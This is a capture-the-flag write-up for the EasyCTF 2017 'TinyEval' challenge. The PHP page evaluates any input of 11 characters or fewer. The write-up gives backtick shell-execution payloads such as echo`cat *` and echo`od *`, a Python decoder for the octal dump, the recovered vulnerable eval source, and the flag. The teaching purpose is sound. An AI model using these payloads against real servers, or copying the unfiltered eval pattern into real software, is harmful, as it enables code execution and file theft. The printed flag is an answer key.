# TinyEval - 100 points

This [page](http://tinyeval.web.easyctf.com) will evaluate anything you give it.

### Solutions

In this problem, we are basically allowed to execute PHP code on the server, but only if it’s 11 or less characters. Of course, each call is independent from each other.

In PHP, text between backticks are executed as shell commands. We can see everything in the directory by entering:

```
echo`ls`
```

It turns out that there’s a file called flag.txt in the same directory, and our goal is to view its contents.

The normal solution to this problem would probably be to enter:

```
echo`cat *`
```

The star, which will return every file, is necessary for staying under the character limit. This results in an output showing the contents of everything in the directory, including the flag.

However, there’s a cooler solution that can be done in 10 characters:

```
echo`od *`
```

od essentially dumps data from files in printable formats. In this context, it will print all the files in the directory in an octal dump.

We can decode the data by converting each octal section into two bytes, which are stored in little-endian format:

```python
# only 6 character sections are data
a = '0000000 051106 046517 072040 072165 066565 066057 066541 035160 0000020 060554 062564 072163 042412 050130 051517 020105 030070 0000040 051012 047125 071440 062145 026440 020151 071447 040457 0000060 066154 073557 073117 071145 064562 062544 043040 066151 0000100 044545 063156 027557 066101 067554 047567 062566 071162 0000120 062151 020145 066101 027554 020047 062457 061564 060457 0000140 060560 064143 031145 071457 072151 071545 062455 060556 0000160 066142 062145 030057 030060 062055 063145 072541 072154 0000200 061456 067157 005146 052522 020116 031141 067145 067555 0000220 020144 062562 071167 072151 005145 052522 020116 066562 0000240 026440 063162 027440 070141 027560 005052 047503 054520 0000260 027040 027440 070141 027560 051012 047125 062440 064143 0000300 020157 047442 072160 067551 071556 026440 067111 062544 0000320 062570 056163 021156 037040 027040 072150 061541 062543 0000340 071563 041412 042115 023440 071057 067165 071456 023550 0000360 060545 074563 072143 075546 072151 071447 031137 030460 0000400 057467 067141 057504 062567 071047 057545 072163 066151 0000420 057554 071565 067151 057547 044120 037520 037477 005175 0000440 070074 043476 073151 020145 062555 071440 066557 072145 0000460 064550 063556 072040 020157 073145 066141 036041 070057 0000500 005076 036012 070077 070150 064412 020146 064450 071563 0000520 072145 022050 050137 051517 055524 061447 062155 056447 0000540 024451 075440 020012 020040 022040 066543 020144 020075 0000560 057444 047520 052123 023533 066543 023544 035535 020012 0000600 020040 064440 020146 071450 071164 062554 024156 061444 0000620 062155 020051 020076 030461 020051 005173 020040 020040 0000640 020040 020040 061545 067550 021040 067563 071162 026171 0000660 074440 072557 020162 072163 064562 063556 064440 020163 0000700 067564 020157 067554 063556 035040 021050 005073 020040 0000720 020040 020175 066145 062563 075440 020012 020040 020040 0000740 020040 062440 064143 020157 073145 066141 022050 066543 0000760 020144 020056 035442 024442 005073 020040 020040 005175 0001000 005175 037077 005012 063074 071157 020155 062555 064164 0001020 062157 070075 071557 037164 036012 067151 072560 020164 0001040 074564 062560 072075 074145 020164 060556 062555 061475 0001060 062155 005076 064474 070156 072165 072040 070171 036545 0001100 072563 066542 072151 005076 027474 067546 066562 000076 0001117'
a = a.split(' ')
o = ''
for c in a:
    if len(c) == 6:
        t = bin(int(c,8))[2:].zfill(16)
        o += chr(int(t[8:],2))+chr(int(t[:8],2))
```

The result contains the flag:

```
FROM tutum/lamp:latest
EXPOSE 80
RUN sed -i 's/AllowOverride FileInfo/AllowOverride All/' /etc/apache2/sites-enabled/000-default.conf
RUN a2enmod rewrite
RUN rm -rf /app/*
COPY . /app/
RUN echo "Options -Indexes\n" > .htaccess
CMD '/run.sh'easyctf{it's_2017_anD_we're_still_using_PHP???}
<p>Give me something to eval!</p>

<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (strlen($cmd) > 11) {
        echo "sorry, your string is too long :(";
    } else {
        echo eval($cmd . ";");
    }
}
?>

<form method=post>
<input type=text name=cmd>
<input type=submit>
</form>
```

flag: easyctf{it's_2017_anD_we're_still_using_PHP???}

### External Writeups

* [defund's writeup](https://defund.io/post/easyctf-2017-writeups/)
* [https://www.bamsoftware.com/computers/easyctf-2017/#tinyeval](https://www.bamsoftware.com/computers/easyctf-2017/#tinyeval)
